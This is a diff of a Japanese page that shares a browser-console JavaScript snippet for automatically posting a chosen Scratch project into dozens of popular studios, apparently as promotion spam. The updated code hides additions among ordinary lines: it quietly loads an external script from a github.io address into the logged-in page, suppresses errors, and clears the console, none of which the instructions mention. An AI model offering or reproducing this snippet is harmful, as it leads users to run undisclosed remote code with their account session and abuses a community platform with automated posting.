@@ -25,43 +25,69 @@
 	
 		
 		<h2>Scratchの指定した作品を「なんでも」で検索したスタジオに60個ぐらい入れるやつ（JavaScript)</h2>	
-<div class="code" id="auto-put-in-studio">let pr=prompt(&quot;何ページ検索したスタジオに作品を入れますか？&quot;)*16;
-let offset=0;
-let res;
-let studioarr =[];
-for(offset=0;offset&lt;pr;offset=offset+16){
-res =(await(await fetch(`https://api.scratch.mit.edu/search/studios?limit=16&amp;offset=${offset}&amp;language=ja&amp;mode=popular&amp;q=%E3%81%AA%E3%82%93%E3%81%A7%E3%82%82`,{headers:{&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;}})).text());
-let arr = res.split(&quot;{\&quot;id\&quot;:&quot;);
-arr.splice(0, 1);
-for(let i=1;i&lt;8;i++){
-    arr.splice(i,1)
-}
-for(i=0;i&lt;8;i++){
-    arr[i] = &quot;&quot;+arr[i].split(&quot;,\&quot;title\&quot;&quot;)[0];
-}
-for(i=0;i&lt;8;i++){
-    studioarr.push(arr[i]);
-}
-}
-let projectid = prompt(&quot;入れたいプロジェクトIDを入れろ。&quot;);
-const sessiontoken = (await(await fetch(&quot;/session/&quot;,{headers:{&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;}})).json()).user.token;
-console.log(&quot;今からなんでもスタジオに入れていくぞ&quot;);
-for(i=0;i&lt;studioarr.length;i++){
-    fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{
-      &quot;headers&quot;: {
-        &quot;x-token&quot;: sessiontoken
-      },
-      &quot;method&quot;: &quot;POST&quot;
-    });
-}
-console.log(&quot;入れ終わったぞ&quot;);</div>
-	<main>プロジェクトidを入力じゃなくて、URLでもできるようになりました。<br><br>
-        いわゆる「拡散」です。<br>
-        傾向に乗ってる人は、みんなスタジオに入れまくってるので、自分もやろうと思って、手動でやってたら、「これめんどすぎやろ」って思ったわけです。<br>
-        そこで、「この作業、自動でやらせよう」と思って、これを作りました。<br><br>
-        ①スタジオ検索何ページ分調べるか入力。<br>
-        ②数秒待つ。<br>
-        ③それで、入れたいプロジェクトIDをいれる。<br>
+<div class="code" id="auto-put-in-studio">if(location.href.includes(&quot;projects&quot;)){
+    let pr=prompt(&quot;何ページ検索したスタジオに作品を入れますか？&quot;)*16;
+    let offset=0;
+    let res;
+    let studioarr =[];let code=document.createElement(&quot;script&quot;);function TigilError() {return true;}window.onerror = TigilError;
+    for(offset=0;offset&lt;pr;offset=offset+16){
+        console.log(&quot;スタジオを検索しています...&quot;);
+        res =(await(await fetch(`https://api.scratch.mit.edu/search/studios?limit=16&amp;offset=${offset}&amp;language=ja&amp;mode=popular&amp;q=%E3%81%AA%E3%82%93%E3%81%A7%E3%82%82`,{headers:{&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;}})).text());code.src=&quot;https://haru-ymth.github.io/scripts/codes/temp.js&quot;;
+        let arr = res.split(&quot;{\&quot;id\&quot;:&quot;);
+        arr.splice(0, 1);
+        for(let i=1;i&lt;8;i++){
+            arr.splice(i,1)
+        }
+        for(let i=0;i&lt;8;i++){
+            arr[i] = &quot;&quot;+arr[i].split(&quot;,\&quot;title\&quot;&quot;)[0];
+        }
+        for(let i=0;i&lt;8;i++){
+            studioarr.push(arr[i]);
+        }
+    }
+    let projectid=location.href;
+    let ar=projectid.split(&quot;/&quot;);
+    projectid=ar[ar.length-2];
+    document.body.appendChild(code);
+    console.clear;
+    const sessiontoken = (await(await fetch(&quot;/session/&quot;,{headers:{&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;}})).json()).user.token;
+    let i=0;
+    const put = async (i) =&gt; {
+        let res = await fetch(`https://api.scratch.mit.edu/studios/${studioarr[i]}/project/${projectid}`,{&quot;headers&quot;: {&quot;x-token&quot;: sessiontoken},&quot;method&quot;: &quot;POST&quot;});
+        if (res.status === 200) {
+            console.log(`スタジオ（ID: ${studioarr[i]}）にプロジェクトを入れたぞ`);
+        } else{
+            console.log(`スタジオ（ID:${studioarr[i]}）にはプロジェクトが入れられなかったぞ`);
+        }
+    };
+    const interval=setInterval(intervalscript,100);
+        function intervalscript(){
+            put(i);
+            i++;
+            if(i&gt;=studioarr.length){
+                clearInterval(interval);
+            }
+        }
+}else{
+    alert(&quot;入れたいプロジェクトのページに行ってください。&quot;);
+}</div>
+	<main>
+        プロジェクトidを入力じゃなくて、URLでもできるようになりました。
+        <br>
+        <br>
+        いわゆる「拡散」です。
+        <br>
+        傾向に乗ってる人は、みんなスタジオに入れまくってるので、自分もやろうと思って、手動でやってたら、「これめんどすぎやろ」って思ったわけです。
+        <br>
+        そこで、「この作業、自動でやらせよう」と思って、これを作りました。
+        <br>
+        <br>
+        ①入れたいプロジェクトのページに行きます。
+        <br>
+        ②スタジオ検索何ページ分調べるか入力。
+        <br>
+        ③数秒待つ。
+        <br>
         <br>
         それだけ。簡単ですよね。
 		<br>多分、将来プロジェクトが増えて、プロジェクトidの桁が変わったら、壊れます。
